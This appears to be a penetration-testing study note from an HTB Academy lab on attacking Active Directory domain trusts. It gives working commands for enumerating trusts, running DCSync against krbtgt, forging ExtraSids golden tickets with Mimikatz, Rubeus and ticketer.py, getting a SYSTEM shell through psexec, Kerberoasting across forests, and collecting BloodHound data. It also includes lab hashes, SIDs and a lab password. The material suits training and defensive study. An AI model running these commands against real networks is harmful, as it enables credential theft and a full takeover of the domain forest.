# Domain Trusts Primer
## Enumerating Trust Relationships
#### Using Get-ADTrust

```powershell
Get-ADTrust -Filter *
```
#### Checking for Existing Trusts using Get-DomainTrust

```PowerShell
Get-DomainTrust
```
#### Using Get-DomainTrustMapping

```powershell
Get-DomainTrustMapping
```

From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:
#### Checking Users in the Child Domain using Get-DomainUser

```PowerShell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

Another tool we can use to get Domain Trust is `netdom`
#### Using netdom to query domain trust

```powershell
netdom query /domain:inlanefreight.local trust
```
#### Using netdom to query workstations and servers

```PowerShell
netdom query /domain:inlanefreight.local workstation
```

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

## SID History Primer
**What is it?** It is an Active Directory attribute that stores a user's previous SID

**SID History Injection:** 
- **How it works:** An attacker with high privileges in a domain (e.g., a compromised child domain) injects the SID of a high-privilege group (like `Enterprise Admins` from the parent domain) into the `sidHistory` attribute of an account they control.
- **Why it works:** When the user logs in, their access token includes all SIDs from their `sidHistory`. The system grants them the privileges associated with those SIDs.
- **Key Tool:** `Mimikatz` is mentioned as a tool capable of performing this injection.

## ExtraSids Attack - Mimikatz
This attack allows compromising the parent domain once the child domain has been compromised.
Within the same forest, the `sidHistory` property is respected due to the lack of **SID Filtering** protection. **SID Filtering** is a protection put in place to filter out authentication requests from a domain in another forest across a trust.

**Example:**
If a user in a child domain has their `sidHistory` set to the **Enterprise Administrators Group** (which only exists in the parent domain), they are treated as a member of this group, which allows administrative access to the entire forest.

In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain

**What  do we need to have after Child Domain Compromise?**
To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

```ad-info
The account `krbtgt` is used to encrypt/sign all Kerberos tickets granted within a given domain.
```

```ad-note
Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.
```
#### Obtaining the KRBTGT Account's NT Hash using Mimikatz

```powershell
mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt" "exit"
```
#### Using Get-DomainSID

```powershell
Get-DomainSID
```
#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
#### Creating a Golden Ticket with Mimikatz

```powershell
mimikatz.exe kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

## ExtraSids Attack - Rubeus
#### Creating a Golden Ticket using Rubeus

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
#### Performing a DCSync Attack

Perform **DCSync** using `mimikatz` normally.

# Attacking Domain Trusts - Child -> Parent Trusts - from Linux

We can perform the same attack from Linux attacker host, we'll need to gather the same information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain
#### Performing DCSync with secretsdump.py

```sh
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
#### Performing SID Brute Forcing using lookupsid.py

```sh
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

After gathering all information, we can use `impacket-ticketer` to forge a Golden Ticket
#### Constructing a Golden Ticket using ticketer.py

```sh
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
#### Setting the KRB5CCNAME Environment Variable

```sh
export KRB5CCNAME=hacker.ccache
```
#### Getting a SYSTEM shell using Impacket's psexec.py

```sh
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

```ad-info
Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

- Obtains the SID for the Enterprise Admins group of the parent domain
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain

Finally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
```
#### Performing the Attack with raiseChild.py

```sh
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```


---

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

## Cross-Forest Kerberoasting
#### Enumerating Accounts for Associated SPNs Using Get-DomainUser

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
#### Enumerating the mssqlsvc Account

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## Admin Password Re-Use & Group Membership

If we compromised a privileged account in Domain Admins / Enterprise Admins in Domain A, and found an account with the same name in Domain B, we should check for password re-use.

```ad-example
Account in Domain A: `adm_bob.smith`
Account in Domain B: `bsmith_admin`
```

We can use the `PowerView` function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`.
#### Using Get-DomainForeignGroupMember

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# Output:GroupDomain : FREIGHTLOGISTICS.LOCAL GroupName : Administrators GroupDistinguishedName : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL MemberDomain : FREIGHTLOGISTICS.LOCAL MemberName : S-1-5-21-3842939050-3880317879-2865463114-500 MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS TICS,DC=LOCAL

Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

# Output: INLANEFREIGHT\administrator
```

The above command shows that the built-in Administrators group in `FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for `INLANEFREIGHT.LOCAL` domain as a member.

## SID History Abuse - Cross Forest

SID history can also be abused across a forest trust.

If a user is migrated from one forest to another and **SID filtering** is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. 

```ad-danger
If the SID of an account with **administrative privileges** in **Forest A** is added to the **SID history** attribute of an account in **Forest B**, assuming they can authenticate **across** the forest, then this account will have **administrative privileges** when accessing resources in the **partner forest**.
```

![[SID History Cross Forest.png|697]]

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

## Cross-Forest Kerberoasting
#### Using GetUserSPNs.py

```sh
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Adding the `-request` flag gives us the TGS ticket.

## Hunting Foreign Group Membership with Bloodhound-python
#### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

```sh
cat /etc/resolv.conf 
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8) 
# DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN 
# 127.0.0.53 is the systemd-resolved stub resolver. 
# run "resolvectl status" to see details about the actual nameservers. 
#nameserver 1.1.1.1 
#nameserver 8.8.8.8 

domain INLANEFREIGHT.LOCAL 
nameserver 172.16.5.5
```
#### Running bloodhound-python Against INLANEFREIGHT.LOCAL

```sh
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
#### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf

```sh
domain FREIGHTLOGISTICS.LOCAL 
nameserver 172.16.5.238
```
#### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL

```sh
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
